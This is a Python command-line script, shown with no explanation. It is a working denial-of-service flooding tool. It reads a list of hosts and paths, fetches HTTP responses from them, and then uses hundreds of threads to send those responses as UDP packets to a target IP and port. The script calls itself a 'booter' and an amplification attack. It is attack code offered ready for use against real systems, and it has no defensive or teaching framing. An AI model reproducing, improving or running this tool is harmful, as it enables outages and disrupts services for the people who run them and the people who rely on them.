import socket,threading,sys

def requests(ip,port,path):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,port))
        s.send(f'GET {path} HTTP/1.1\nHost: {ip}\n\n\r\r'.encode())
        d = s.recv(99999999)
        return d
    except: return f'GET {path} HTTP/1.1\nHost: {ip}\n\n\r\r'

def DOS(ip,port,amp,booter,times,path):
    raw_amp = amp.split(':')
    try:port2 = raw_amp[1]
    except:port2 = 80
    packet = requests(raw_amp[0],int(port2),path)
    try:
       for _ in range(times):
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
        [s.sendto(packet,((ip,port))) for _ in range(booter)]
    except:pass

ip = ''; files = ''
port = 0; booter = 0; times = 0
load = 0
if len(sys.argv) == 6:
    ip = sys.argv[1]
    port = int(sys.argv[2])
    times = int(sys.argv[3])
    booter = int(sys.argv[4])
    files = sys.argv[5]
else:
    print(f'{sys.argv[0]} <IP> <PORT> <TIME> <BOOTER> <LIST>')
    exit()
with open(files,'r') as f:
    amp = []
    for a in f.readlines():
        ip_amp = a.replace('\n','').replace('\r','').split(' ')
        if ip_amp[0] not in amp:
            try:amp.append(f'{ip_amp[0]} {ip_amp[1]}')
            except:amp.append(f'{ip_amp[0]} /')
    if load == 1:print('\n')
    for ip_amp in amp:
      raw = ip_amp.split(' ')
      if raw[0] != '':[threading.Thread(target=DOS,args=(ip,port,raw[0],booter,times,raw[1])).start() for _ in range(250)]
    exit()
